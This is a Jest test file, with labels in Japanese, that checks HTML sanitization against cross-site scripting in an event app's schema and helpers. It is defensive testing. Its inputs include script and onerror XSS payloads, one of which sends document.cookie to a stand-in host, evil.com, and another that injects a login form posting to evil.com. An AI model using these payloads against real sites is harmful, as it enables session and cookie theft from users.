import { sanitizeHtml, sanitizeEventDescription } from "@/lib/utils/sanitize";
import { createEventSchema } from "@/lib/validations/event";

describe("XSS防止統合テスト", () => {
  describe("Zodスキーマでのサニタイゼーション", () => {
    it("タイトルのHTMLタグを除去する", () => {
      const input = {
        title: '<script>alert("XSS")</script>イベント',
        date: "2025-12-31T23:59:59Z",
        fee: "1000",
        payment_methods: "stripe",
      };

      const result = createEventSchema.parse(input);
      expect(result.title).toBe("イベント");
      expect(result.title).not.toContain("<script>");
    });

    it("説明文のHTMLタグを除去する", () => {
      const input = {
        title: "テストイベント",
        date: "2025-12-31T23:59:59Z",
        fee: "1000",
        payment_methods: "stripe",
        description: '<div>説明</div><script>alert("XSS")</script>',
      };

      const result = createEventSchema.parse(input);
      expect(result.description).toBe("説明");
      expect(result.description).not.toContain("<script>");
    });

    it("場所のHTMLタグを除去する", () => {
      const input = {
        title: "テストイベント",
        date: "2025-12-31T23:59:59Z",
        fee: "1000",
        payment_methods: "stripe",
        location: '<img src="x" onerror="alert(1)">東京',
      };

      const result = createEventSchema.parse(input);
      expect(result.location).toBe("東京");
      expect(result.location).not.toContain("<img");
    });
  });

  describe("React コンポーネントでのレンダリング防止", () => {
    it("sanitizeEventDescriptionは改行を保持する", () => {
      const input = "<p>説明1</p>\n<div>説明2</div>";
      const result = sanitizeEventDescription(input);
      expect(result).toBe("説明1\n説明2");
    });

    it("複雑なXSS攻撃を防ぐ", () => {
      const maliciousInput = `
        <script>
          document.cookie = 'stolen';
          fetch('/api/steal', { method: 'POST', body: document.cookie });
        </script>
        <img src="x" onerror="
          var img = new Image();
          img.src = 'http://evil.com/steal?data=' + document.cookie;
        ">
        正常なコンテンツ
      `;

      const result = sanitizeEventDescription(maliciousInput);
      expect(result).toContain("正常なコンテンツ");
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("<img");
      expect(result).not.toContain("document.cookie");
      expect(result).not.toContain("fetch");
    });
  });

  describe("エッジケース", () => {
    it("ネストしたタグを適切に処理する", () => {
      const input = '<div><span><script>alert("nested")</script></span></div>Content';
      const result = sanitizeHtml(input);
      expect(result).toBe("Content");
    });

    it("不正なHTMLタグを適切に処理する", () => {
      const input = '<script<script>alert("XSS")</script>';
      const result = sanitizeHtml(input);
      expect(result).toBe("");
    });

    it("HTMLエンティティは保持される", () => {
      const input = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const result = sanitizeHtml(input);
      expect(result).toBe('&lt;script&gt;alert("XSS")&lt;/script&gt;');
    });
  });

  describe("パフォーマンステスト", () => {
    it("大量のHTMLタグを効率的に処理する", () => {
      const largeInput = Array(1000).fill("<div><span>test</span></div>").join("");
      const start = performance.now();
      const result = sanitizeHtml(largeInput);
      const end = performance.now();

      expect(result).toBe("test".repeat(1000));
      expect(end - start).toBeLessThan(100); // 100ms以内
    });
  });

  describe("実際の攻撃シナリオ", () => {
    it("SessionStorage/LocalStorageへの攻撃を防ぐ", () => {
      const input = `
        <script>
          localStorage.setItem('malicious', 'data');
          sessionStorage.setItem('attack', 'payload');
        </script>
        イベント説明
      `;

      const result = sanitizeEventDescription(input);
      expect(result).toContain("イベント説明");
      expect(result).not.toContain("localStorage");
      expect(result).not.toContain("sessionStorage");
    });

    it("DOM操作攻撃を防ぐ", () => {
      const input = `
        <script>
          document.getElementById('login').innerHTML = '<form action="http://evil.com">';
        </script>
        正常なイベント情報
      `;

      const result = sanitizeEventDescription(input);
      expect(result).toContain("正常なイベント情報");
      expect(result).not.toContain("document.getElementById");
      expect(result).not.toContain("innerHTML");
    });
  });
});
